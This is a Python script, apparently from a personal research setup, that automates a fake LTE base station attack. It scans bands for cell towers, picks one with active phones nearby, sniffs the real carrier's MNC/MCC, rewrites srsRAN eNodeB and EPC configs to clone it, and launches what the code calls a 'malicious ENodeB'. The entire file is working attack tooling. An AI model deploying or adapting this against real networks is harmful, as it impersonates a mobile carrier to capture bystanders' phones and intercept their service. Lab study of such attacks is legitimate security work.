import subprocess
import time
import signal_strength
import mnc_sniff
import sys
import lte_nr_frequency as lte_freq


# TODO - SPECIFY BAND TOWER FOUND IN

DEVICE_ARGS = "id=2"
LTESNIFFER_PATH = "/home/brayden/Clones/LTESniffer/build/src/"
BANDS=[12]
RSSI_CUTOFF = -40
# BANDS=[2,4,12,13,17,66,71]

def run_enb():
    try:
        subprocess.Popen(["sudo", "srsenb", "config/enb.conf"] + sys.argv[1:], timeout=60)
    except:
        pass

def run_epc():
    try:
        subprocess.Popen(["sudo", "srsepc", "config/epc.conf"] + sys.argv[1:], timeout=60)
    except:
        pass


# Modify the srsenb.conf file with the newly selected params
def patch_enb(mnc, mcc, earfcn):
    # Prepare sed commands
    mcc_string = f"s/mcc = .*/mcc = {mcc}/g"
    mnc_string = f"s/mnc = .*/mnc = {mnc}/g"
    earfcn_string = f"s/dl_earfcn = .*/dl_earfcn = {earfcn}/g"

    subprocess.run(["sed", "-i", mcc_string, "config/enb.conf"])
    subprocess.run(["sed", "-i", mnc_string, "config/enb.conf"])
    subprocess.run(["sed", "-i", earfcn_string, "config/enb.conf"])


def patch_epc(mnc, mcc):
    mcc_string = f"s/mcc = .*/mcc = {mcc}/g"
    mnc_string = f"s/mnc = .*/mnc = {mnc}/g"

    subprocess.run(["sed", "-i", mcc_string, "config/epc.conf"])
    subprocess.run(["sed", "-i", mnc_string, "config/epc.conf"])


def sniff_sib(tower):
    tower = tower.split(" ")
    freq = tower[2] + "e6"
    mnc, mcc = mnc_sniff.find_mnc(LTESNIFFER_PATH, freq)
    return(mnc, mcc)


def calculate_ul(dl_earfcn):
    freq_dict = lte_freq.get_lte_freq(dl_earfcn)
    return(freq_dict['ul_freq'])


# Take the stdout from the cell_search binary and return list of towers detected
def parse_output(output):
    towers = []
    output = output.split("\n")
    # Find any towers
    for line in output:
        if "Found CELL" in line and "EARFCN" in line:
            # pull ID and check if greater than 2
            line_id = line.split(" ")
            id = line_id[5][6:]
            id = int(id.strip(","))
            if id > 2:
                towers.append(line)
    return(towers)


# Detect if there are any UEs associated with chosen tower
# Returns True/False
def detect_ue(tower):
    # Get EARFCN
    tower = tower.split(" ")
    dl_earfcn = tower[4].strip(",")[7:]
    # Calcuate Uplink
    freq = calculate_ul(int(dl_earfcn))
    # Calucate RSSI
    print("===== CALCULATING RSSI =====")
    rssi = signal_strength.signal_strength(freq)
    print(f"\nRSSI : {rssi:.4f}")
    if rssi > RSSI_CUTOFF:
        return(True)
    else:
        return(False)


def select_tower(towers):
    print("\nChoose Cell Tower to Target\n")
    for i in range(0, len(towers)):
        tower_specs = towers[i].split(" ")
        print(f"    {i+1}) {tower_specs[2]} {tower_specs[3]} {tower_specs[4]} {tower_specs[5]} {tower_specs[11]}")

    selection_index = input("\nTower Number : ")
    index = int(selection_index) - 1
    return(towers[index])


# Run the cell_search binary with args and then return the output
def run_scanner():
    all_output = ""
    for band in BANDS:
        # Run subprocess to scan for cell towers
        print(f"======= Scanning {band} Band =======")
        start_time = time.time()
        result = subprocess.run(['./cell_search', '-a', 'id=2', '-b', str(band)], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        
        # Add Results to accumulator
        byte_output = result.stdout
        output = byte_output.decode("utf-8")
        all_output += output

        # Print and Return
        time_run = "{:.2f}".format(time.time() - start_time)
        print(f"======= Band {band} Finished (Took {time_run} seconds)=======")
    return all_output



def main():
    # TODO - Allow to select range of earfcn to look for to speed scanning 
    output = run_scanner()
    towers = parse_output(output)
    while True:
        selected_tower = select_tower(towers)
        print(selected_tower)
        if detect_ue(selected_tower):
            print("UE Detected, capturing MNC/MCC\n")
            break
        else:
            print("No UEs detected, select new tower")
    # end
    # Sniff SIB information
    print("===== Sniffing SIB information =====")
    mnc, mcc = sniff_sib(selected_tower)
    print(f"MNC : {mnc}\nMCC : {mcc}")
    
    print("===== Patching srsRAN configs =====")
    # get dl_earfcn
    split_tower = selected_tower.split(" ")
    dl_earfcn = split_tower[4].strip(",")[7:]

    patch_enb(mnc, mcc, dl_earfcn)
    patch_epc(mnc, mcc)

    # Deploy malicious ENB
    print("===== Deploy malicious ENodeB =====")
    run_epc()
    run_enb()


if __name__ == "__main__":
    main()